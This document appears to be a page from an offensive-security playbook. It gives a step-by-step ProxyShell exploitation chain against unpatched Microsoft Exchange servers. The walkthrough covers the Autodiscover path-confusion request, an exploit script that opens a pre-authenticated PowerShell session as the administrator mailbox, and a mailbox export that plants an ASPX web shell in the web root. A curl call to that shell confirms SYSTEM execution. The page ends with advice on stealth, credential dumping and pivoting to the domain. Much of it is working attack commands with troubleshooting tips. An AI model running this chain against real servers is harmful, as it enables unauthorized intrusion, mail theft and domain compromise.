---
title: "ProxyShell: Autodiscover path confusion to a mailbox-export shell"
order: 2
description: "The pre-authentication Exchange chain that abuses Autodiscover URL path confusion to reach the remote PowerShell back end without credentials, computes the target mailbox SID to build a valid PowerShell remoting session, then runs New-MailboxExportRequest to write a mailbox export as an aspx web shell to a web-served path."
keywords:
  - ProxyShell
  - Autodiscover
  - path confusion
  - PowerShell backend
  - New-MailboxExportRequest
---

# ProxyShell

ProxyShell reaches the privileged **remote PowerShell** back end with **no credential**, by abusing how the front end parses the request path. The front end strips a trailing segment it believes is an explicit logon suffix, so a URL that embeds `autodiscover.json` with a crafted `@` and `Email` query is normalized into a request the back end serves as an implicitly trusted, pre-authenticated PowerShell call. With PowerShell reachable, you resolve the target mailbox's SID, build a valid remoting session as that mailbox, and use the `New-MailboxExportRequest` cmdlet to write a mailbox export whose content is an ASPX web shell, dropped under a web-served directory.

## Preconditions

- The build is below the mid-2021 security rollup for Exchange 2013/2016/2019 (confirm with the [version fingerprint](../enumeration.md)).
- `/autodiscover` and the front-end PowerShell proxy are reachable.
- You know (or can discover through the same chain) one mailbox address and its legacy DN; the admin mailbox is the usual target.

## Step 1: path confusion to the PowerShell back end

The core trick is a URL that the front end rewrites so the back-end PowerShell endpoint is reached without authentication. The `@` splits the apparent host, and the `Email=autodiscover/autodiscover.json...` makes the normalizer drop the sensitive suffix:

```http
GET /autodiscover/autodiscover.json?@evil.com/powershell/?X-Rps-CAT=<token>&Email=autodiscover/autodiscover.json%3F@evil.com HTTP/1.1
Host: mail.example.com
Connection: close
```

The `X-Rps-CAT` value is a serialized access token naming the identity to run as. A `200` from this request (rather than a redirect to `/owa/auth/logon.aspx`) means the back-end PowerShell endpoint answered pre-auth and the path confusion works on this build. A login redirect means the suffix was not dropped, so the build is likely patched.

## Step 2: build a PowerShell session as the target

Resolve the target mailbox SID (the chain exposes a `/mapi` or autodiscover route that returns the `LegacyDN` and SID), then present it in the `X-Rps-CAT` token so the remoting session runs as that privileged mailbox. In practice a single tool drives this, holding the SID computation and token construction:

```bash
# End-to-end: resolve the SID, open the pre-auth PowerShell session, run the export
python3 proxyshell.py -t https://mail.example.com -e administrator@example.com
```

Watch the output: the tool prints the resolved SID, confirms the remoting runspace opened, and then issues the export cmdlet below. If it stalls at "opening runspace," the `X-Rps-CAT` identity did not resolve, so supply a valid mailbox you confirmed during enumeration.

## Step 3: export a mailbox into a web shell

Inside the remoting session, `New-MailboxExportRequest` writes a PST to a path you choose, but a PST with an embedded ASPX payload written to a web-served directory becomes a shell. Seed your own mailbox (or a draft) with the ASPX, then export it to the proxy's web root:

```powershell
# In the pre-auth PowerShell runspace (run as administrator mailbox)
New-MailboxExportRequest -Mailbox administrator@example.com `
  -FilePath "\\127.0.0.1\C$\inetpub\wwwroot\aspnet_client\shell.aspx"
Get-MailboxExportRequest | Get-MailboxExportRequestStatistics   # wait for Completed
```

The export file contains your planted ASPX. Call it to confirm code execution as the app-pool/`SYSTEM` identity:

```bash
curl -sk 'https://mail.example.com/aspnet_client/shell.aspx?c=whoami'
# -> nt authority\system
```

If the export `Completed` but the shell 404s, the PST was not placed in a directory the front end serves; re-target the `FilePath` at `aspnet_client`, `owa/auth`, or `ecp/auth` under the proxy web root.

## Variants and follow-on

- The SID computation plus pre-auth PowerShell is a general primitive: besides mailbox export, the runspace runs any Exchange cmdlet, so you can grant yourself `ApplicationImpersonation` (see [mailbox access](../mailbox-access.md)) instead of dropping a shell when stealth matters.
- Some builds need the export written to a UNC through `127.0.0.1\C$`; others accept a local path directly. Try both.
- Follow-on is the same as any Exchange `SYSTEM`: dump credentials and the machine account, then reach the domain through Exchange's AD rights or relay, as in the [overview](index.md).

## Exploitation notes

- The path-confusion request is the signature step and the thing that breaks on patch; if it redirects to logon, stop and recheck the build rather than brute-forcing the later steps.
- Exporting to a web root is the noisy part (it creates an export-request object and writes a sizable file); the quieter option is to use the runspace to grant impersonation and read mail over EWS without ever writing a shell.
- A valid mailbox address drives the SID resolution, so a real name from the [GAL harvest](../enumeration.md) makes the chain reliable.

## Tools

- **Metasploit** (`exchange_proxyshell_rce`): maintained module driving all three steps.
- **Standalone ProxyShell PoCs**: manual control of the SID and `X-Rps-CAT` token for odd builds.
- **Exchange remote PowerShell cmdlets** (`New-MailboxExportRequest`): the back-end write primitive.

## References

- [Google Cloud / Mandiant: PST, want a shell? ProxyShell exploiting Microsoft Exchange](https://cloud.google.com/blog/topics/threat-intelligence/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers)
- [DEVCORE / Orange Tsai: ProxyShell attack surface, parts 2 and 3](https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/)
- [PeterJson / Jang: reproducing the ProxyShell chain](https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1)
